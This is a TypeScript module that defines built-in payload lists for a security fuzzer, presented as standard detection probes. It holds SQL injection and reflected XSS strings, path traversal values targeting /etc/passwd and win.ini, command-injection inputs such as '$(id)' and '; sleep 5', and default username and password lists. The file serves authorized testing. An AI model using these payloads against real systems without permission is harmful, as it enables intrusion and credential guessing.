/**
 * Built-in payload lists for the Fuzzer: standard, publicly documented input-validation TEST
 * strings of the kind shipped with OWASP ZAP, Burp and the SecLists project. They are detection
 * probes for authorized security testing, not weaponized exploits. One list per name.
 */
export interface PayloadList {
  name: string;
  values: string[];
}

export const PAYLOAD_LISTS: PayloadList[] = [
  {
    name: 'SQL injection (detect)',
    values: [
      "'",
      '"',
      "' OR '1'='1",
      "' OR 1=1--",
      '" OR "1"="1',
      "') OR ('1'='1",
      "admin'--",
      "' OR ''='",
      "1' ORDER BY 1--",
      "1' AND SLEEP(5)--",
      "0' UNION SELECT NULL--",
    ],
  },
  {
    name: 'XSS (reflected)',
    values: [
      '<script>alert(1)</script>',
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '"><img src=x onerror=alert(1)>',
      '<body onload=alert(1)>',
    ],
  },
  {
    name: 'Path traversal',
    values: [
      '../../../../etc/passwd',
      '....//....//....//etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..\\..\\..\\..\\windows\\win.ini',
      '/etc/passwd',
      'C:\\windows\\win.ini',
    ],
  },
  {
    name: 'Command injection',
    values: [';id', '| id', '|| id', '& whoami', '&& whoami', '`id`', '$(id)', '%0aid', '; sleep 5'],
  },
  {
    name: 'Common usernames',
    values: ['admin', 'administrator', 'root', 'user', 'test', 'guest', 'operator', 'support', 'demo', 'sa'],
  },
  {
    name: 'Common passwords',
    values: ['password', '123456', 'admin', 'root', 'P@ssw0rd', 'letmein', 'changeme', 'welcome', 'qwerty', 'test123'],
  },
  {
    name: 'Special characters',
    values: ["'", '"', '<', '>', '&', '|', ';', '`', '$', '%', '\\', '\n', '\r', '%00', '{{7*7}}', '${7*7}'],
  },
  {
    name: 'HTTP methods',
    values: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT'],
  },
];
